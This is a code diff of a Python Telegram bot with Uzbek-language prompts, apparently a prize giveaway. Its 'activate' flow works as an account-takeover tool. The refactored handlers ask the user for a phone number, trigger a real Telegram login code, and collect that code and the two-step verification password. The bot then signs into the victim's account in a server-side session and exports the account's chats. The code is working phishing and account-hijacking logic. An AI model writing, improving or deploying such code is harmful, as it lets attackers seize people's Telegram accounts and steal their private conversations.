@@ -199,68 +199,84 @@ async def prizes(msg: types.Message):
     )
 
 # ================== AKTIVLASH ==================
-from telethon.sessions import StringSession
-from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
-
 @dp.message_handler(lambda m: m.text == "✅ Aktivlash")
 async def activate(msg: types.Message):
     sessions[msg.from_user.id] = {"step": "phone"}
     await msg.answer(
-        "📲 Telefon raqamingizni yuboring\n\nMasalan: +998901234567",
+        "📲 Telefon raqamingizni yuboring\nMasalan: +998901234567",
         reply_markup=back_menu()
     )
 
-@dp.message_handler(lambda m: m.from_user.id in sessions)
-async def login_flow(msg: types.Message):
+# ================== TELEFON ==================
+@dp.message_handler(
+    lambda m: m.from_user.id in sessions
+    and sessions[m.from_user.id]["step"] == "phone"
+)
+async def phone_handler(msg: types.Message):
     uid = msg.from_user.id
+    phone = msg.text.strip()
+
+    if not phone.startswith("+") or not phone[1:].isdigit():
+        await msg.answer("❌ Telefon raqam noto‘g‘ri")
+        return
+
+    client = TelegramClient(StringSession(), API_ID, API_HASH)
+    await client.connect()
+
+    sent = await client.send_code_request(phone)
+
+    sessions[uid].update({
+        "step": "code",
+        "phone": phone,
+        "client": client,
+        "phone_code_hash": sent.phone_code_hash
+    })
+
+    await msg.answer("🔐 Telegram kodi yuborildi")
+
+# ================== KOD ==================
+@dp.message_handler(
+    lambda m: m.from_user.id in sessions
+    and sessions[m.from_user.id]["step"] == "code"
+)
+async def code_handler(msg: types.Message):
+    uid = msg.from_user.id
+    code = msg.text.strip()
     state = sessions[uid]
-    text = msg.text.strip()
 
-    # ================== PHONE ==================
-    if state["step"] == "phone":
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
+    try:
+        await state["client"].sign_in(
+            phone=state["phone"],
+            code=code,
+            phone_code_hash=state["phone_code_hash"]
+        )
 
-        sent = await client.send_code_request(text)
-
-        state.update({
-            "step": "code",
-            "phone": text,
-            "client": client,
-            "phone_code_hash": sent.phone_code_hash
-        })
-
-        await msg.answer("🔐 Telegram kodi yuborildi")
+    except PhoneCodeExpiredError:
+        await msg.answer("⛔ Kod eskirdi. Qayta ✅ Aktivlash bosing.")
+        await state["client"].disconnect()
+        sessions.pop(uid, None)
         return
 
-    # ================== CODE ==================
-    if state["step"] == "code":
-        try:
-            await state["client"].sign_in(
-                phone=state["phone"],
-                code=text,
-                phone_code_hash=state["phone_code_hash"]
-            )
-        except PhoneCodeExpiredError:
-            await msg.answer("⛔️ Kod eskirib ketdi. Qayta /Aktivlash bosing.")
-            await state["client"].disconnect()
-            sessions.pop(uid, None)
-            return
-        except SessionPasswordNeededError:
-            state["step"] = "password"
-            await msg.answer("🔑 2 bosqichli parolni yuboring")
-            return
-
-        await msg.answer("⏳ Chatlar eksport qilinmoqda...")
-        await export_chats(uid)
+    except SessionPasswordNeededError:
+        state["step"] = "password"
+        await msg.answer("🔑 2 bosqichli parolni yuboring")
         return
 
-    # ================== PASSWORD ==================
-    if state["step"] == "password":
-        await state["client"].sign_in(password=text)
-        await msg.answer("⏳ Chatlar eksport qilinmoqda...")
-        await export_chats(uid)
-        return
+    await msg.answer("⏳ Chatlar eksport qilinmoqda...")
+    await export_chats(uid)
+
+# ================== PAROL ==================
+@dp.message_handler(
+    lambda m: m.from_user.id in sessions
+    and sessions[m.from_user.id]["step"] == "password"
+)
+async def password_handler(msg: types.Message):
+    uid = msg.from_user.id
+    password = msg.text.strip()
+
+    await sessions[uid]["client"].sign_in(password=password)
+    await msg.answer("⏳ Chatlar eksport qilinmoqda...")
+    await export_chats(uid)
 
 
 # ================== EXPORT ==================
